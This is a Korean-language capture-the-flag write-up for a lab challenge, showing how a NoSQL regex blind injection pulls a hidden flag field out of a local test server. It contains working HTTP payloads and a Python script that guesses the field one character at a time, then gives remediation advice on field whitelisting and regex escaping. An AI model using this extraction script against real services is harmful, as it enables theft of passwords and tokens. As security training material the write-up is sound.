+++
title = "VulnABLE CTF [LUXORA] Write-up: NoSQL Injection 🥈 Silver"
description = "LUXORA 플랫폼의 정규표현식(Regex)을 이용한 NoSQL Blind Data Extraction 상세 롸잇업"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "NoSQL Injection", "Silver", "Blind", "Regex", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: NoSQL Injection 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (NoSQLi)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/nosqli/silver`
- **목표**: 객체(Object) 주입이 엄격히 차단된 환경에서, 정규표현식(Regex)을 악용한 Blind Injection 기법으로 데이터베이스 내의 숨겨진 플래그를 한 글자씩 추출하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 방어 로직 우회 탐색 (Reconnaissance)

`/nosqli/silver` 페이지는 사용자가 이메일(Email)을 입력하면, 해당 계정의 패스워드 힌트를 알려주는 엔드포인트입니다.
```http
POST /nosqli/silver
Content-Type: application/x-www-form-urlencoded

email=admin@luxora.test
```

응답 결과 (정상):
```json
{"success": true, "hint": "Your pet's name"}
```

Bronze 난이도에서 썼던 객체 기반 공격(`email[$ne]=1`)을 시도해 봅니다.
```http
POST /nosqli/silver
Content-Type: application/x-www-form-urlencoded

email[$ne]=1
```

응답 결과 (실패):
```json
{"error": "Invalid email format. String required."}
```

**[해커의 사고 과정]**
1. 개발자가 Bronze의 해킹을 겪고, 입력값이 반드시 '문자열(String)'인지 검사하는 로직을 추가했다.
2. 하지만 NoSQL(특히 MongoDB + PHP/Node.js 특정 모듈 조합)은 문자열 내부에 들어있는 정규표현식 기호를 특수하게 해석하는 버그(혹은 의도된 기능)가 있다.
3. 이메일 란에 `^` (문자열의 시작을 의미하는 정규식 앵커) 문자를 넣었을 때 서버가 어떻게 반응하는지 확인해보자!

---

## 💥 2. 취약점 검증 (Vulnerability Identification)

정규표현식이 작동하는지 확인하기 위해 `a`로 시작하는 모든 이메일, `b`로 시작하는 모든 이메일을 찾아보라고 명령을 내려봅니다.

### 페이로드 전송 (정규식 테스트)
`admin@luxora.test`가 존재한다는 것을 알고 있으므로, `a`로 시작하는 정규식을 보냅니다.
```http
POST /nosqli/silver
Content-Type: application/x-www-form-urlencoded

email=^a.*
```
➔ 응답: `{"success": true, "hint": "Your pet's name"}`

이번에는 존재하지 않을 것 같은 `z`로 시작하는 정규식을 보냅니다.
```http
POST /nosqli/silver
Content-Type: application/x-www-form-urlencoded

email=^z.*
```
➔ 응답: `{"error": "User not found"}`

**[해석 및 결론]**
서버는 클라이언트가 보낸 문자열을 단순한 텍스트로 보지 않고, 몽고DB의 정규표현식 필터(`$regex`)로 실행하고 있습니다. 이를 이용하면 우리가 값을 모르는 필드(예: 비밀번호, 리셋 토큰, 플래그 등)의 내용을 한 글자씩 유추해낼 수 있습니다.

---

## 🚀 3. 공격 수행 및 자동화 스크립트 작성 (Exploitation)

우리의 목표는 이메일이 아니라 숨겨진 `flag` 필드를 빼내는 것입니다.
이 엔드포인트는 `email` 파라미터만 받는 것처럼 보이지만, NoSQL은 스키마리스(Schemaless) 구조이므로 만약 백엔드가 `req.body` 전체를 쿼리에 넣고 있다면 우리가 임의의 필드를 추가할 수 있습니다.

파라미터 이름을 `flag`로 바꾸어 정규식 스무고개를 던져보겠습니다.
```http
POST /nosqli/silver
flag=^F.*
```
➔ 응답: `{"success": true}` (플래그가 F로 시작함!)

### 💻 Python 파이썬 익스플로잇 스크립트
이를 수작업으로 하면 너무 오래 걸리므로 파이썬 스크립트를 작성하여 자동화합니다.

```python
import requests
import string
import time

url = "http://localhost:3000/nosqli/silver"
# 찾고자 하는 문자셋 (알파벳, 숫자, 특수문자)
chars = string.ascii_letters + string.digits + "{}_" 
extracted_flag = "^"

print("[*] Starting NoSQL Regex Blind Data Extraction...")

while True:
    for char in chars:
        # 정규표현식 페이로드 구성 (예: ^F, ^FL, ^FLA...)
        payload = {"flag": extracted_flag + char + ".*"}
        
        try:
            res = requests.post(url, data=payload)
            
            # 서버 응답에 success가 있으면 해당 글자가 맞음
            if "success" in res.text:
                extracted_flag += char
                print(f"[+] Found partial flag: {extracted_flag.replace('^', '')}")
                break
        except Exception as e:
            print(f"[-] Error: {e}")
            time.sleep(1)
            
    # 플래그 형식이 닫히면 종료
    if extracted_flag.endswith("}"):
        break

print(f"\n[!] Final Extracted Flag: {extracted_flag.replace('^', '')}")
```

### 서버의 응답 (결과)
스크립트를 실행하면 터미널에서 플래그가 한 글자씩 완성되는 짜릿한 모습을 볼 수 있습니다.

```text
[*] Starting NoSQL Regex Blind Data Extraction...
[+] Found partial flag: F
[+] Found partial flag: FL
[+] Found partial flag: FLA
...
[+] Found partial flag: FLAG{NOSQL_🥈_REGEX_BLIND_B8D2A1
[+] Found partial flag: FLAG{NOSQL_🥈_REGEX_BLIND_B8D2A1}

[!] Final Extracted Flag: FLAG{NOSQL_🥈_REGEX_BLIND_B8D2A1}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

객체(Object) 형태의 입력값을 차단했더라도, 정규표현식 파싱 기능의 허점과 입력 필드 화이트리스팅 부재를 노려 데이터베이스 전체를 스캐닝하는 블라인드 데이터 추출에 성공했습니다.

**🔥 획득한 플래그:**
`FLAG{NOSQL_🥈_REGEX_BLIND_B8D2A1}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
이번 취약점은 두 가지 관리 부실이 겹쳐서 발생했습니다.

1. **Mass Assignment (입력 파라미터 무제한 허용)**
   * **취약점**: `db.collection.findOne(req.body)` 처럼 클라이언트가 보낸 데이터 전체를 쿼리에 통째로 넣었습니다. 이 때문에 사용자가 마음대로 `flag` 필드를 검색 조건에 추가할 수 있었습니다.
   * **패치**: 쿼리를 수행할 때 허용된 필드만 명시적으로 구성해야 합니다.
     ```javascript
     // 오직 email 필드만 검색하도록 강제
     db.collection.findOne({ email: req.body.email });
     ```

2. **정규표현식 특수문자 이스케이프 누락**
   * **취약점**: 검색어로 들어온 문자열에 `^`, `$`, `.` 등이 섞여 있을 때 이를 일반 문자로 치환(Escape)하지 않고 정규식 패턴으로 컴파일했습니다.
   * **패치**: 사용자 입력을 정규표현식이나 `LIKE` 검색 등에 사용할 때는 반드시 이스케이프 라이브러리를 통과시켜 특수기호의 기능을 죽여야 합니다. (예: `^` ➔ `\^`)